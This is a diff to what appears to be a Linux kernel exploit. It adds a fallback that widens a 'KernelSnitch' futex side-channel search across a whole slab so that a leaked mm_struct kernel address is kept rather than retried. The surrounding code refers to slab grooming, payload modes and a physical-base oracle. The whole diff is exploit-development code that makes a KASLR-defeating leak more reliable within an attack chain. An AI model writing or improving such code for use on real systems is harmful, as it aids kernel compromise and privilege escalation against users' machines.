@@ -2173,6 +2173,30 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
+    defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
+  /*
+   * The groomed object window above is the fastest search, but a leak that
+   * landed on one of the slab's other objects is still a valid leak: the
+   * futex collision set is a property of the leaked mm address, so the same
+   * scan finds that object as soon as the whole slab is searched.  The extra
+   * pass is a stateless address scan (milliseconds), while discarding the
+   * leak tears down the whole groom set and rebuilds it (seconds), so widen
+   * the window here instead of returning 0 and letting the caller retry.
+   */
+  if (leaked == (uintptr_t)-1 && kernelsnitch_widen_search(ks)) {
+    pr_info("KernelSnitch widening object window mode=%d\n",
+            payload_mode);
+    kernelsnitch_bruteforce(ks);
+    leaked = ks->mm_struct;
+    if (leaked != (uintptr_t)-1) {
+      pr_info("KernelSnitch full-slab fallback mode=%d object_index=%zu\n",
+              payload_mode,
+              (leaked - (leaked & ~(ORDER3_SIZE - 1))) / MM_STRUCT_SZ);
+    }
+  }
+#endif
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
